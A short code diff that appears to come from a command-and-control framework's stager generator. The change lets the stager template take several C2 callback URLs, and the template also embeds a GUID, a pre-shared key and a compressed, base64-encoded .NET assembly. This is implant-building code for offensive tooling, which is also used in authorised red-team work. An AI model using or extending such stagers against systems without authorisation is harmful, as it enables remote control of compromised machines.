@@ -20,10 +20,14 @@ class STStager(Stager):
                 guid = uuid.uuid4()
                 psk = gen_stager_psk()
 
+                c2_urls = ','.join(
+                    filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
+                )
+
                 template = template.read()
                 template = template.replace('GUID', str(guid))
                 template = template.replace('PSK', psk)
-                template = template.replace('URLS', f"{listener.name}://{listener['BindIP']}:{listener['Port']}")
+                template = template.replace('URLS', c2_urls)
                 template = template.replace("NAME_GOES_HERE", gen_random_string_no_digits(5))
                 template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly.read()))
                 return guid, psk, template
